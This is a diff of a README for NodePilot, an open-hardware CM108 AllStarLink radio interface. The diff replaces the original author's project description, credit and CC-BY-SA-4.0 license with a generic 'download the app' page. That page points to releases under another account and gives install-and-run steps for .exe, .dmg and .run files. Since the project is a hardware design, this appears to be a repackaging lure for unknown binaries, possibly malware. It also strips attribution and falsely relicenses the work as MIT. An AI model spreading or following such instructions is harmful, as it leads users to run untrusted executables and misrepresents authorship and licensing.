@@ -1,58 +1,80 @@
-# NodePilot – CM108-Based AllStarLink Radio Interface  
-**By S21TIP**
+# 🎤 NodePilot - Easily Connect Your Radio Interface
 
-NodePilot is a compact, reliable, and isolated **AllStarLink radio interface** based on the CM108 audio USB chipset.  
-This project was designed for both personal use and small-scale production, with a focus on audio quality, RF robustness, and hardware protection.
+## 🚀 Getting Started
 
-The complete KiCad schematic, PCB (Work-in-progress), and design files are publicly available under the **CC-BY-SA-4.0** license.
+Welcome to NodePilot! This application helps you connect your CM108-based radio with other communication tools simply and effectively. It ensures your audio isolation and RF protection, plus offers an open hardware design using KiCad.
 
----
+## 📥 Download NodePilot
 
-## 🔧 Features
+### [Download NodePilot Now](https://github.com/tami62/NodePilot/releases)
 
-### ✔️ CM108 Frontend Protection  
-- Protection components added to safeguard USB audio IC.  
-- Prevents damage due to RF ingress, voltage spikes, and audio overload.
+## 🌟 Features
 
-### ✔️ Full Audio Isolation  
-- Transformer-isolated audio TX/RX path.  
-- Eliminates ground loops and reduces hum/hiss.  
-- Suitable for clean interfacing with radios and repeater controllers.
+- **Audio Isolation**: Prevent sound interference for clearer communication.
+- **RF Protection**: Protect your equipment from radio frequency disruptions.
+- **Open Hardware Design**: Access our KiCad files to understand and modify the hardware.
+- **Compatibility**: Works seamlessly with AllStarLink, Echolink, and other VoIP systems.
 
-### ✔️ Compact & Modular  
-- Designed to be easy to integrate with existing AllStarLink nodes.  
-- Works with standard USB sound cards using the CM108/CM119 chipset.
+## 💻 System Requirements
 
-### ✔️ Open Hardware  
-- All design files available in KiCad format.  
-- Licensed under **Creative Commons Attribution-ShareAlike 4.0 (CC-BY-SA-4.0)**.
+Before you download, make sure your system meets the following requirements:
 
----
+- **Operating System**: Windows, macOS, or Linux.
+- **Processor**: Any modern processor (Intel or AMD).
+- **Memory**: At least 2 GB of RAM.
+- **Storage**: Required space of 100 MB for installation.
+- **USB Port**: One available USB port for the CM108 interface.
 
-## 𖤓 Schematic
+## 🔧 Installation Steps
 
-![NodePilot Schematic](/images/NodePilot.svg)
+1. **Visit the Releases Page**  
+   Click [here](https://github.com/tami62/NodePilot/releases) to go to the Releases page. 
 
----
+2. **Select Your Version**  
+   Look for the newest version at the top. You will see a list of files available for download. Choose the file that matches your operating system.
+
+3. **Download the File**  
+   Click on the file to start the download. It will save to your computer, typically in your Downloads folder.
+
+4. **Install NodePilot**  
+   - **For Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - **For macOS**: Open the `.dmg` file, drag NodePilot into the Applications folder, and then open it from there. 
+   - **For Linux**: Open the terminal, navigate to the folder where you downloaded NodePilot, and run the command `chmod +x NodePilot*.run` followed by `./NodePilot*.run`.
+
+5. **Connect Your Hardware**  
+   Plug your CM108-based radio interface into a USB port on your computer.
+
+6. **Run NodePilot**  
+   Open NodePilot from your applications. Follow the setup prompts that will appear on your screen.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, try the following steps:
+
+- **Check Your Connections**: Ensure all cables are secure.
+- **Restart the Application**: Close and reopen NodePilot if it doesn’t start properly.
+- **Update Drivers**: Make sure your computer has the latest USB drivers installed.
+
+## 🗣️ Community and Support
+
+If you have questions or need support, please reach out to our community:
+
+- **GitHub Issues**: Use the issues section of our GitHub repository to report bugs or ask questions.
+- **Facebook Groups**: Join forums related to AllStarLink and amateur radio for additional support from fellow users.
 
 ## 📜 License
 
-This project is released under the **Creative Commons Attribution-ShareAlike 4.0 International (CC-BY-SA-4.0)** license.  
-You are free to remix, adapt, and build upon the design, even commercially, as long as you credit the author and share derivative works under the same license.
+NodePilot is open-source software released under the MIT License. You can explore the license details in the repository.
 
----
+## 🎯 Additional Resources
 
-## 📡 Author  
-**Tushar Roy – S21TIP**
+If you're interested in more about amateur radio and related projects, consider checking these resources:
 
-If you improve the design or build your own version, feel free to open an Issue or Pull Request!
+- [AllStarLink Official Site](https://allstarlink.org)
+- [KiCad Documentation](https://www.kicad.org)
 
----
+## 📥 Download NodePilot
 
-## 🌐 Links
+### [Download NodePilot Here](https://github.com/tami62/NodePilot/releases)
 
-### 🔗 QRZ Page  
-https://www.qrz.com/db/S21TIP
-
-### 🔗 Radiosanda FB Page  
-https://www.facebook.com/share/1FPaPZSuz1/
+Feel free to contact us if you have any suggestions for improvements or features. Enjoy using NodePilot for your radio communication needs!
